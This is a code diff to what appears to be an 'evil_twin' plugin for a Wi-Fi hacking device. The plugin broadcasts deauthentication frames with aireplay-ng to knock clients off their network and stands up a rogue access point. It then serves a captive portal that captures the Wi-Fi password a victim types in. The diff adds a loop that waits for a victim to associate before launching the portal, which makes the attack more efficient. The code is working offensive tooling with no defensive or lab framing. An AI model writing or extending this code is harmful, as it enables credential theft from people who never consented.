@@ -24,7 +24,8 @@
 #   portal_port      = 8080
 #   deauth_rounds    = 3
 #   deauth_interval  = 15
-#   session_timeout  = 300   # seconds before giving up if no client connects (0 = no timeout)
+#   client_timeout   = 60    # seconds to wait for a victim to associate after deauth (0 = skip if nobody connects)
+#   session_timeout  = 300   # seconds to wait for password entry once a client is connected (0 = no timeout)
 #   submit           = true
 #   wordlist_folder  = "/home/pi/wordlists/"
 #   max_queue        = 10
@@ -202,7 +203,7 @@ def _ssid_from_filename(path):
 class _Session:
     def __init__(self, ssid, pcap, channel, iface_ap, iface_mon,
                  ap_ip, portal_port, deauth_rounds, deauth_interval,
-                 on_captured, session_timeout=300):
+                 on_captured, client_timeout=60, session_timeout=300):
         self.ssid            = ssid
         self.pcap            = pcap
         self.channel         = channel
@@ -213,7 +214,8 @@ class _Session:
         self.deauth_rounds   = deauth_rounds
         self.deauth_interval = deauth_interval
         self.on_captured     = on_captured
-        self.session_timeout = session_timeout  # seconds; 0 = no timeout
+        self.client_timeout  = client_timeout   # seconds to wait for a station to associate
+        self.session_timeout = session_timeout  # seconds to wait for password once associated
         self._procs          = []
         self._tmpfiles       = []
         self._stop           = threading.Event()
@@ -261,6 +263,32 @@ class _Session:
             _run(f"aireplay-ng --deauth {self.deauth_rounds}"
                  f" -a FF:FF:FF:FF:FF:FF {self.iface_mon}")
             self._stop.wait(timeout=self.deauth_interval)
+
+    def _wait_for_client(self):
+        """Poll iw station dump until a device associates with our AP or timeout.
+        Returns True if someone connected, False if nobody showed up."""
+        deadline = time.time() + self.client_timeout
+        logging.info(
+            "[evil_twin] Waiting up to %ds for a client to associate on '%s'",
+            self.client_timeout, self.ssid
+        )
+        while time.time() < deadline and not self._stop.is_set():
+            try:
+                r = subprocess.run(
+                    ["iw", "dev", self.iface_ap, "station", "dump"],
+                    capture_output=True, text=True, timeout=5
+                )
+                if "Station" in r.stdout:
+                    logging.info("[evil_twin] Client associated on '%s' — starting portal", self.ssid)
+                    return True
+            except Exception:
+                pass
+            time.sleep(2)
+        logging.info(
+            "[evil_twin] No clients connected to '%s' after %ds — skipping portal",
+            self.ssid, self.client_timeout
+        )
+        return False
 
     def _nat_rules(self, add=True):
         act = "-A" if add else "-D"
@@ -332,7 +360,9 @@ class _Session:
             self._start_dnsmasq()
             self._nat_rules(add=True)
             threading.Thread(target=self._deauth_loop, daemon=True).start()
-            self._run_portal()
+            if self._wait_for_client():
+                self._run_portal()
+            # else: nobody nearby — cleanup() in finally handles teardown
         finally:
             self.cleanup()
 
@@ -473,6 +503,7 @@ class EvilTwin(plugins.Plugin):
                 deauth_rounds=int(self.options.get("deauth_rounds", 3)),
                 deauth_interval=int(self.options.get("deauth_interval", 15)),
                 on_captured=lambda s, pw: self._captured(s, pw, pcap),
+                client_timeout=int(self.options.get("client_timeout", 60)),
                 session_timeout=int(self.options.get("session_timeout", 300)),
             )
             try:
